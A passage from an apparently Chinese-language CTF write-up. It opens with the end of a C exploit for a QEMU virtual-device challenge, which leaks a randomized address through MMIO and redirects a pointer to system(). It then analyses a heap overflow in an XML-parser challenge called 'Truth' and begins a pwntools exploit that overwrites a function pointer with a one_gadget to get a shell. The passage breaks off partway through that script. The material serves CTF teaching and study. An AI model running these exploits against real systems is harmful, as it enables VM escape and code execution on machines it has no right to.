class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> mmio_addr = <span class="number">0xfebf1000</span>;</span><br><span class="line"><span class="type">uint32_t</span> mmio_size = <span class="number">0x800</span>;</span><br><span class="line"><span class="type">int32_t</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mem_map</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* dev, <span class="type">size_t</span> offset, <span class="type">size_t</span> size )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open( dev, O_RDWR | O_SYNC );</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* result = mmap( <span class="literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !result ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close( fd );</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(value,pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_tea_encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0xC6EF3720</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum += <span class="number">0x61C88647</span>;  </span><br><span class="line">    &#125;<span class="keyword">while</span>(sum);                                            <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_tea_decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>, i;  <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;<span class="keyword">while</span>(sum != <span class="number">0xC6EF3720</span>);                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"></span><br><span class="line">  mmio_mem = mem_map(<span class="string">&quot;/dev/mem&quot;</span>, mmio_addr, mmio_size);</span><br><span class="line">  <span class="keyword">if</span> (!mmio_mem)&#123;</span><br><span class="line">      die(<span class="string">&quot;mmio or vga mmap failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get process address\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;iopl 3 failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pmio_write(<span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> res[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  res[<span class="number">0</span>] = mmio_read(<span class="number">3</span> &lt;&lt; <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">  res[<span class="number">1</span>] = mmio_read(<span class="number">3</span> &lt;&lt; <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>, res[<span class="number">0</span>], res[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span>  key[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  my_tea_decrypt(res, key);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>, res[<span class="number">0</span>], res[<span class="number">1</span>]);</span><br><span class="line">  <span class="type">uint64_t</span> randr_address = ((<span class="type">uint64_t</span> )res[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  randr_address += res[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;rand address is %p\n&quot;</span>, randr_address);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_address = randr_address - <span class="number">0x4aeb0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> system_address = libc_address + <span class="number">0x55410</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system address is %p\n&quot;</span>, system_address);</span><br><span class="line"></span><br><span class="line">  res[<span class="number">0</span>] = system_address &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">  res[<span class="number">1</span>] = system_address &gt;&gt; <span class="number">32</span>;</span><br><span class="line">  my_tea_encrypt(res, key);</span><br><span class="line">  <span class="type">uint64_t</span> en_system_address = ((<span class="type">uint64_t</span> )res[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  en_system_address += res[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enc system address is %p\n&quot;</span>, en_system_address);</span><br><span class="line">  getchar();</span><br><span class="line">  mmio_write(<span class="number">3</span> &lt;&lt; <span class="number">3</span>, en_system_address, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  res[<span class="number">1</span>] = <span class="number">0x67616c66</span>;</span><br><span class="line">  res[<span class="number">0</span>] = <span class="number">0x20746163</span>;</span><br><span class="line">  my_tea_encrypt(res, key);</span><br><span class="line">  <span class="type">uint64_t</span> enc_sh = ((<span class="type">uint64_t</span> )res[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  enc_sh += res[<span class="number">0</span>];</span><br><span class="line">  pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">0</span>, enc_sh , <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  pmio_write(<span class="number">0x1c</span>, <span class="number">0x2620736c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Truth"><a href="#Truth" class="headerlink" title="Truth"></a>Truth</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>直接给出了源代码，程序提供了四种功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line">		<span class="keyword">switch</span> (choice)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="type">char</span> temp;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input file&#x27;s content&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">while</span> (read(STDIN_FILENO, &amp;temp, <span class="number">1</span>) &amp;&amp; temp != <span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				xmlContent.push_back(temp);</span><br><span class="line">			&#125;</span><br><span class="line">			xmlfile.parseXml(xmlContent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input the node name which you want to edit&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; nodeName &gt;&gt; content;</span><br><span class="line">			xmlfile.editXML(nodeName, content);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			pnode(*xmlfile.node-&gt;begin(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MEME&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; nodeName;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">auto</span> temp = pnode(*xmlfile.node-&gt;begin(), <span class="string">&quot;&quot;</span>, nodeName)) </span><br><span class="line">				temp-&gt;meme(temp-&gt;backup);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这里大致说一下，首先是<code>parseXML</code>函数，函数会根据<code>xml</code>的格式依次递归解析，每个标签都是一个<code>node</code>，用结构体<code>XML_NODE</code>来进行表示。在<code>parse</code>过程中最值得注意的就是<code>XML_NODE::parseNodeContents</code>中的处理逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (*current)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">switch</span> (*current)</span><br><span class="line">		&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        case CHARACTACTERS::LT:</span></span><br><span class="line"><span class="comment">        case CHARACTACTERS::NEWLINE:</span></span><br><span class="line"><span class="comment">				case CHARACTACTERS::BLANK:</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">auto</span> lt = iterFind(current, CHARACTACTERS::LT);</span><br><span class="line">			data = <span class="built_in">std</span>::make_shared &lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(current, lt);</span><br><span class="line">			backup = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">			current = lt;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>该函数在处理完标签的左半部分的时候发生调用如果没有遇到上述的三种情况也就是<code>&lt;</code>，<code>\n</code>，空格三种字符的情况下就会进行堆块的分配，这里共分配了两个堆块，第一个我称之为<code>content</code>堆块，该堆块的大小由当前字符到最近的一个<code>&lt;</code>之间的距离决定，第二个是固定的堆块为<code>backup</code>。</p>
<p>接下来看一下<code>edit</code>函数，首先根据用户输入的名称找到对应的<code>Node</code>结构体，接着检查了<code>node-&gt;data</code>中的字符的长度</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">XML_NODE::isInsertable</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">0x50</span> || x &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> nullptr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> backup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即需要小于<code>0x50</code>，接着就会将<code>data</code>中的数据拷贝到<code>backup</code>中，并将<code>data</code>更新为用户输入的<code>content</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; a-&gt;data-&gt;length(); i++)</span><br><span class="line">&#123;</span><br><span class="line">  a-&gt;backup[i] = (*a-&gt;data)[i];</span><br><span class="line">&#125;</span><br><span class="line">*(a-&gt;data) = content;</span><br></pre></td></tr></table></figure>

<p>接着看一下第三个功能也就是<code>show</code>函数，这里通过<code>pnode</code>函数打印出了用户指定的<code>Node</code>结构体的内容，包含<code>xml</code>中的属性字段以及<code>data</code>。</p>
<p>接着就是最后一个函数，类似于一个后门函数，调用了结构体中的一个函数指针，打印出了<code>backup</code>的内容</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>这里可能是优化导致的问题，<code>edit</code>函数中的针对<code>data</code>的长度检查失效了，导致用户针对<code>backup</code>可以任意长度的堆溢出。而从调试中我们可以发现如果我们输入下面的<code>XML</code>，<code>backup</code>堆块相邻的位置存在一个<code>node</code>结构体</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Lin</span> <span class="attr">1</span>=<span class="string">&quot;111&quot;</span>&gt;</span></span><br><span class="line">  data</span><br><span class="line"><span class="tag">&lt;<span class="name">Lin2</span>&gt;</span></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="tag">&lt;/<span class="name">Lin2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Lin</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也就是<code>backup</code>堆块与<code>Lin2</code>结构体相邻。这里我们就可以直接覆写结构体了，一个<code>Node</code>结构体的布局如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0xab0c30</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0xab0c10</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0xab0c20</span>:       <span class="number">0x00000000004054e0</span>      <span class="number">0x0000000100000002</span></span><br><span class="line"><span class="number">0xab0c30</span>:       <span class="number">0x0000000000405340</span>（meme函数指针存储地址）      <span class="number">0x0000000000ab0c48</span> 堆地址</span><br><span class="line"><span class="number">0xab0c40</span>:       <span class="number">0x0000000000000003</span>      <span class="number">0x00007fff006e694c</span></span><br><span class="line"><span class="number">0xab0c50</span>:       <span class="number">0x00007fffec193a00</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xab0c60</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000ab11d0</span></span><br><span class="line"><span class="number">0xab0c70</span>:       <span class="number">0x0000000000ab11d0</span>      <span class="number">0x0000000000ab11d0</span></span><br><span class="line"><span class="number">0xab0c80</span>:       <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000ab0e40</span></span><br><span class="line"><span class="number">0xab0c90</span>:       <span class="number">0x0000000000ab0e30</span>      <span class="number">0x0000000000ab1390</span></span><br><span class="line"><span class="number">0xab0ca0</span>:       <span class="number">0x0000000000ab1380</span>      <span class="number">0x0000000000ab0f00</span>(backup)</span><br></pre></td></tr></table></figure>

<p>根据结构体中的指针泄漏得到<code>heap address</code>，接着覆写结构体中的函数指针，利用第四个函数<code>getshell</code>。</p>
<p>这里还差一个<code>libc</code>基地址的泄露。这里也可以根据<code>backup</code>得到，在<code>data = std::make_shared &lt;std::string&gt;(current, lt);</code>语句执行完毕之后会产生一个和<code>data</code>大小相同的堆块，如果此堆块为<code>unsorted bin</code>，那么我们可以直接通过打印<code>backup</code>来泄漏得到<code>libc</code>基地址。</p>
<p>在将函数指针覆写为<code>gadget</code>的时候遇到了一个问题就是所有的<code>gadget</code>都无法实现，但是经过调试发现<code>rsp+0x60</code>（这里对应的<code>gadget</code>的条件是<code>rsp+0x70=NULL</code>，环境变量的参数，由于<code>call</code>会压入返回地址因此是<code>0x68</code>）部分存储的是<code>Node</code>的名称，一共是<code>0x10</code>子节，也就是<code>rsp+0x68</code>部分存储的是<code>Node</code>名称的后半段，是一个非法的地址，需要注意的是这里的<code>rsp+0x70=NULL</code>并不一定要求该位置一定为<code>NULL</code>而是一个合法的指针数组即可（数组起始到结束包含的指针均合法，并且以<code>NULL</code>结尾）</p>
<p>因此这里可以将<code>Node</code>的名称缩短至四子节，使得<code>rsp+0x68=NULL</code>，也就是<code>gadget</code>执行的时候<code>rsp+0x70=NULL</code>，从而成功执行<code>execve</code>。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./Truth&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.216.214&#x27;</span>, <span class="number">45116</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">file_content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;file&#x27;s content\n&quot;</span>, file_content)</span><br><span class="line">    p.sendline(<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, content</span>):</span><br><span class="line">    p.sendlineafter(<span 